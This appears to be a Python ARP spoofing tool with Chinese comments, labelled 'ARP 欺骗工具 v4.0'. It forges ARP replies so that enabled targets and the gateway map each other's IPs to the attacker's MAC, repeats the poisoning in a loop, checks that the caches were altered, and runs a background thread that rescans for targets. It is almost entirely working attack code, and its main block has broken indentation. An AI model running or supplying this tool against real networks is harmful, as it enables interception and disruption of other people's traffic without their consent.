import socket
import psutil
import struct
import time
import re
import toml
import os
import subprocess
import sys
import threading
from datetime import datetime

from npcap_checker import check_npcap_before_attack, comprehensive_npcap_check, print_detection_results, install_npcap_guide

# ============================================================
# 配置更新管理
# ============================================================

class ConfigUpdater:
    """配置文件定时更新器"""
    
    def __init__(self, config_file="config.toml", interval=300):
        """
        Args:
            config_file: 配置文件路径
            interval: 更新间隔（秒），默认300秒（5分钟）
        """
        self.config_file = config_file
        self.interval = interval
        self.running = False
        self.thread = None
        self.last_update = None
        
    def run_scanner(self):
        """运行网络扫描器更新配置"""
        try:
            # 调用 network_scanner.py
            result = subprocess.run(
                [sys.executable, "network_scanner.py"],
                capture_output=True,
                text=True,
                timeout=60
            )
            if result.returncode == 0:
                self.last_update = datetime.now()
                return True
            return False
        except Exception as e:
            print(f"⚠️  扫描失败: {e}")
            return False
    
    def load_config(self):
        """加载当前配置"""
        try:
            with open(self.config_file, 'r', encoding='utf-8') as f:
                return toml.load(f)
        except:
            return None
    
    def get_current_gateway(self):
        """获取当前网关 IP"""
        try:
            if sys.platform.lower().startswith('win'):
                result = subprocess.run(
                    ['ipconfig'],
                    capture_output=True,
                    text=True
                )
                lines = result.stdout.split('\n')
                in_wlan = False
                for line in lines:
                    if '无线局域网适配器 WLAN' in line or '无线局域网适配器 Wi-Fi' in line:
                        in_wlan = True
                        continue
                    if in_wlan and '默认网关' in line:
                        match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                        if match:
                            gateway = match.group(1)
                            if gateway and not gateway.startswith('fe80'):
                                return gateway
                    if in_wlan and '适配器' in line and 'WLAN' not in line and 'Wi-Fi' not in line:
                        in_wlan = False
            return None
        except:
            return None
    
    def check_and_update(self, verbose=False):
        """检查并更新配置"""
        print(f"\n🔄 [{datetime.now().strftime('%H:%M:%S')}] 检查网络变化...")
        
        # 获取当前网关
        current_gateway = self.get_current_gateway()
        
        # 加载现有配置
        config = self.load_config()
        if not config:
            print("   ⚠️  无法加载配置文件")
            return False
        
        old_gateway = config.get('gateway', {}).get('ip')
        
        # 检查网关是否变化
        if current_gateway and old_gateway and current_gateway != old_gateway:
            print(f"   🌐 网关变化: {old_gateway} -> {current_gateway}")
            self.run_scanner()
            return True
        
        # 检查目标设备是否在线（简单 ping 检测）
        targets = config.get('targets', [])
        enabled_targets = [t for t in targets if t.get('enabled', True)]
        
        offline_count = 0
        for target in enabled_targets:
            if not self.ping_host(target['ip']):
                offline_count += 1
        
        if offline_count > 0:
            print(f"   ⚠️  {offline_count} 个目标不在线，重新扫描...")
            self.run_scanner()
            return True
        
        print(f"   ✅ 网络正常，配置无需更新")
        return False
    
    def ping_host(self, ip):
        """Ping 测试"""
        try:
            param = '-n' if sys.platform.lower().startswith('win') else '-c'
            result = subprocess.run(
                ['ping', param, '1', '-w', '500', ip],
                capture_output=True,
                text=True,
                timeout=2
            )
            return result.returncode == 0
        except:
            return False
    
    def start_background_updater(self, verbose=False):
        """启动后台更新线程"""
        if self.thread and self.thread.is_alive():
            return
        
        self.running = True
        self.thread = threading.Thread(target=self._update_loop, args=(verbose,))
        self.thread.daemon = True
        self.thread.start()
        print(f"🔄 配置自动更新已启动 (间隔: {self.interval}秒)")
    
    def stop_background_updater(self):
        """停止后台更新"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)
    
    def _update_loop(self, verbose=False):
        """后台更新循环"""
        while self.running:
            time.sleep(self.interval)
            if self.running:
                self.check_and_update(verbose)


# ============================================================
# ARP 工具核心函数（保持不变）
# ============================================================

def load_config(config_file="config.toml"):
    """加载 TOML 配置文件"""
    try:
        with open(config_file, 'r', encoding='utf-8') as f:
            return toml.load(f)
    except FileNotFoundError:
        print(f"❌ 配置文件 {config_file} 不存在")
        return None
    except toml.TomlDecodeError as e:
        print(f"❌ 配置文件格式错误: {e}")
        return None

def toHex(type, data):
    """将 IP 或 MAC 地址转换为字节"""
    if type == 0:  # IP 地址
        parts = data.split('.')
        return bytes([int(part) for part in parts])
    elif type == 1:  # MAC 地址
        mac_clean = data.replace(':', '').replace('-', '').replace('.', '').upper()
        if len(mac_clean) != 12:
            raise ValueError(f"无效的 MAC 地址长度: {mac_clean}")
        return bytes([int(mac_clean[i:i+2], 16) for i in range(0, 12, 2)])
    return b''

def format_mac(mac_str):
    """格式化 MAC 地址为标准格式"""
    if not mac_str or mac_str == "auto":
        return None
    mac_clean = re.sub(r'[:-]', '', mac_str).upper()
    return ':'.join([mac_clean[i:i+2] for i in range(0, 12, 2)])

def create_arp_packet(target_mac, source_mac, opcode, sender_mac, sender_ip, target_ip):
    """创建 ARP 数据包（以太网帧）"""
    eth_header = target_mac + source_mac + b'\x08\x06'
    arp_header = b'\x00\x01\x08\x00\x06\x04' + opcode
    arp_header += sender_mac + sender_ip + target_mac + target_ip
    return eth_header + arp_header

def get_network_info(interface_name="WLAN"):
    """获取网络接口信息"""
    dic = psutil.net_if_addrs()
    for adapter in dic:
        if interface_name in adapter:
            snicList = dic[adapter]
            ipv4 = None
            mac = None
            for snic in snicList:
                if snic.family.name in {'AF_LINK', 'AF_PACKET'}:
                    mac = snic.address
                elif snic.family.name == 'AF_INET':
                    ipv4 = snic.address
            if ipv4 and mac:
                return ipv4, format_mac(mac), adapter
    return None, None, None

def get_mac_from_arp_cache(target_ip):
    """从 ARP 缓存中获取 MAC 地址"""
    try:
        subprocess.run(['ping', target_ip, '-n', '1'], timeout=2, capture_output=True)
        time.sleep(0.5)
        
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=2)
        for line in result.stdout.split('\n'):
            if target_ip in line:
                mac_match = re.search(r'([0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2})', line)
                if mac_match:
                    return format_mac(mac_match.group(1))
    except Exception as e:
        print(f"⚠️  获取 {target_ip} 的 MAC 失败: {e}")
    return None

def send_arp_packet_scapy(arp_packet_bytes, interface="WLAN", verbose=False):
    """使用 scapy 发送 ARP 包"""
    try:
        from scapy.all import sendp, Ether
        packet = Ether(arp_packet_bytes)
        for _ in range(3):
            sendp(packet, iface=interface, verbose=False)
        return True
    except ImportError:
        if verbose:
            print("❌ Scapy 未安装")
        return False
    except Exception as e:
        if verbose:
            print(f"❌ Scapy 发送失败: {e}")
        return False

def send_arp_packet_windows_fallback(arp_packet, target_ip, verbose=False):
    """备选方案：原始套接字"""
    try:
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
        raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        ipv4, mac, adapter = get_network_info("WLAN")
        if not ipv4:
            return False
        
        raw_socket.bind((ipv4, 0))
        raw_socket.sendto(arp_packet, (target_ip, 0))
        raw_socket.close()
        return True
    except Exception as e:
        if verbose:
            print(f"❌ 原始套接字失败: {e}")
        return False

def send_arp_packet(arp_packet, target_ip, interface="WLAN", verbose=False):
    """发送 ARP 包"""
    success = send_arp_packet_scapy(arp_packet, interface, verbose)
    if not success:
        success = send_arp_packet_windows_fallback(arp_packet, target_ip, verbose)
    return success

def restore_arp_table(targets, gateway_info, self_info, interface="WLAN", verbose=False):
    """恢复 ARP 表"""
    print("\n🔄 正在恢复 ARP 表...")
    
    self_ip_bytes = toHex(0, self_info['ip'])
    self_mac_bytes = toHex(1, self_info['mac'])
    gateway_ip_bytes = toHex(0, gateway_info['ip'])
    
    for target in targets:
        if not target.get('enabled', True):
            continue
            
        target_ip_bytes = toHex(0, target['ip'])
        
        if target.get('mac') and target['mac'] != 'auto':
            target_mac_bytes = toHex(1, target['mac'])
            restore_packet = create_arp_packet(
                self_mac_bytes,
                target_mac_bytes,
                b'\x00\x02',
                target_mac_bytes,
                target_ip_bytes,
                gateway_ip_bytes
            )
            send_arp_packet(restore_packet, gateway_info['ip'], interface, verbose)
        
        if gateway_info.get('mac') and gateway_info['mac'] != 'auto':
            gateway_mac_bytes = toHex(1, gateway_info['mac'])
            restore_packet = create_arp_packet(
                self_mac_bytes,
                gateway_mac_bytes,
                b'\x00\x02',
                gateway_mac_bytes,
                gateway_ip_bytes,
                target_ip_bytes
            )
            send_arp_packet(restore_packet, target['ip'], interface, verbose)
    
    print("✅ ARP 表已恢复")

def arp_spoof_attack(target, gateway, self_info, interface="WLAN", interval=2, verbose=False):
    """对单个目标执行 ARP 欺骗"""
    target_mac = target.get('mac')
    if not target_mac or target_mac == 'auto':
        target_mac = get_mac_from_arp_cache(target['ip'])
        if not target_mac:
            if verbose:
                print(f"⚠️  无法获取 {target['name']} 的 MAC，使用广播")
            target_mac = "ff:ff:ff:ff:ff:ff"
    
    gateway_mac = gateway.get('mac')
    if not gateway_mac or gateway_mac == 'auto':
        gateway_mac = get_mac_from_arp_cache(gateway['ip'])
        if not gateway_mac:
            if verbose:
                print(f"⚠️  无法获取网关 MAC，使用广播")
            gateway_mac = "ff:ff:ff:ff:ff:ff"
    
    self_ip_bytes = toHex(0, self_info['ip'])
    self_mac_bytes = toHex(1, self_info['mac'])
    target_ip_bytes = toHex(0, target['ip'])
    target_mac_bytes = toHex(1, target_mac)
    gateway_ip_bytes = toHex(0, gateway['ip'])
    gateway_mac_bytes = toHex(1, gateway_mac)
    
    packet_to_target = create_arp_packet(
        target_mac_bytes,
        self_mac_bytes,
        b'\x00\x02',
        self_mac_bytes,
        gateway_ip_bytes,
        target_ip_bytes
    )
    
    packet_to_gateway = create_arp_packet(
        gateway_mac_bytes,
        self_mac_bytes,
        b'\x00\x02',
        self_mac_bytes,
        target_ip_bytes,
        gateway_ip_bytes
    )
    
    success1 = send_arp_packet(packet_to_target, target['ip'], interface, verbose)
    success2 = send_arp_packet(packet_to_gateway, gateway['ip'], interface, verbose)
    
    if success1 and success2:
        if verbose:
            print(f"✅ {target['name']} 欺骗成功")
        return True
    else:
        if verbose:
            print(f"❌ {target['name']} 欺骗失败")
        return False

def verify_arp_cache(target_ip, gateway_ip, self_mac):
    """验证 ARP 缓存"""
    print("\n🔍 验证 ARP 缓存状态:")
    
    result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
    
    for line in result.stdout.split('\n'):
        if target_ip in line:
            mac_match = re.search(r'([0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2})', line)
            if mac_match:
                mac = format_mac(mac_match.group(1))
                if mac == self_mac:
                    print(f"  ✅ 目标 ({target_ip}) MAC 已被篡改")
                else:
                    print(f"  ❌ 目标 ({target_ip}) MAC 未被篡改: {mac}")
        
        if gateway_ip in line:
            mac_match = re.search(r'([0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2})', line)
            if mac_match:
                mac = format_mac(mac_match.group(1))
                if mac == self_mac:
                    print(f"  ✅ 网关 ({gateway_ip}) MAC 已被篡改")
                else:
                    print(f"  ❌ 网关 ({gateway_ip}) MAC 未被篡改: {mac}")

# ============================================================
# 主程序
# ============================================================

if __name__ == "__main__":
    print("=" * 60)
    print("🎯 ARP 欺骗工具 v4.0 (自动更新配置)")
    print("=" * 60)
    
    # 0. 创建配置更新器
    update_interval = 300  # 5分钟检查一次
    updater = ConfigUpdater("config.toml", interval=update_interval)
    
    # 1. 检测 Npcap
    from npcap_checker import check_npcap_before_attack
    if not check_npcap_before_attack(ask_user=True):
        print("❌ Npcap 未正确安装")
        sys.exit(1)
    
    # 2. 加载配置文件
config = load_config()
if not config:
    print("❌ 配置文件加载失败")
    sys.exit(1)

# 确保 settings 存在
if 'settings' not in config:
    print("⚠️  配置文件中缺少 [settings]，添加默认值...")
    config['settings'] = {
        'interface': 'WLAN',
        'interval': 2,
        'duration': 0,
        'auto_recovery': True,
        'verbose': False,
        'auto_update': True,
        'update_interval': 300
    }
    # 保存
    with open("config.toml", 'w', encoding='utf-8') as f:
        toml.dump(config, f)
    print("✅ 已添加默认配置")

    # 3. 获取配置
    settings = config.get('settings', {})
    interface = settings.get('interface', 'WLAN')
    verbose = settings.get('verbose', False)
    interval = settings.get('interval', 2)
    duration = settings.get('duration', 0)
    auto_recovery = settings.get('auto_recovery', True)
    auto_update = settings.get('auto_update', True)
    update_interval = settings.get('update_interval', 300)
    
    # 4. 获取本机网络信息
    ipv4_self_str, mac_self_str, adapter = get_network_info(interface)
    
    if not ipv4_self_str or not mac_self_str:
        print(f"❌ 未找到接口: {interface}")
        print("\n可用接口:")
        dic = psutil.net_if_addrs()
        for adapter_name in dic:
            for snic in dic[adapter_name]:
                if snic.family.name == 'AF_INET':
                    print(f"  - {adapter_name}: {snic.address}")
        sys.exit(1)
    
    print(f"\n✅ 本机信息:")
    print(f"  接口: {adapter}")
    print(f"  IP: {ipv4_self_str}")
    print(f"  MAC: {mac_self_str}")
    
    self_info = {'ip': ipv4_self_str, 'mac': mac_self_str}
    
    # 5. 获取网关信息
    gateway = config.get('gateway', {})
    gateway_ip = gateway.get('ip')
    
    if not gateway_ip:
        print("❌ 配置文件中缺少网关 IP")
        sys.exit(1)
    
    print(f"\n🌐 网关信息:")
    print(f"  IP: {gateway_ip}")
    
    # 6. 获取目标列表
    targets = config.get('targets', [])
    enabled_targets = [t for t in targets if t.get('enabled', True)]
    
    if not enabled_targets:
        print("❌ 没有启用的目标")
        sys.exit(1)
    
    print(f"\n🎯 目标列表 (共 {len(enabled_targets)} 个):")
    for target in enabled_targets:
        print(f"  - {target.get('name', '未命名')}: {target['ip']}")
    
    # 7. 启动后台配置更新器
    if auto_update:
        updater.start_background_updater(verbose)
    
    print("\n" + "=" * 60)
    print("开始 ARP 欺骗攻击...")
    print("按 Ctrl+C 停止攻击")
    if auto_update:
        print(f"🔄 配置每 {update_interval} 秒自动检查更新")
    print("=" * 60)
    
    # 8. 执行 ARP 欺骗
    try:
        count = 0
        start_time = time.time()
        
        while True:
            count += 1
            current_time = time.time() - start_time
            
            if duration > 0 and current_time > duration:
                print(f"\n⏰ 达到设定的持续时间 ({duration} 秒)，停止")
                break
            
            print(f"\n🔄 第 {count} 轮攻击 (已运行 {int(current_time)}s)")
            
            # 重新加载配置（可能已被更新器更新）
            config = load_config()
            if config:
                enabled_targets = [t for t in config.get('targets', []) if t.get('enabled', True)]
                gateway_ip = config['gateway'].get('ip', gateway_ip)
            
            success_count = 0
            for target in enabled_targets:
                success = arp_spoof_attack(target, gateway, self_info, adapter, interval, verbose)
                if success:
                    success_count += 1
            
            print(f"📊 本轮结果: {success_count}/{len(enabled_targets)} 成功")
            
            if count % 5 == 0 and enabled_targets:
                verify_arp_cache(enabled_targets[0]['ip'], gateway_ip, mac_self_str)
            
            time.sleep(interval)
            
    except KeyboardInterrupt:
        print("\n\n⏹️  用户中断攻击")
    
    # 9. 停止后台更新器
    if auto_update:
        updater.stop_background_updater()
    
    # 10. 恢复 ARP 表
    if auto_recovery:
        restore_arp_table(enabled_targets, gateway, self_info, adapter, verbose)
    else:
        print("\n⚠️  注意: 未恢复 ARP 表")
    
    print("\n" + "=" * 60)
    print("🏁 程序结束")
    print("=" * 60)
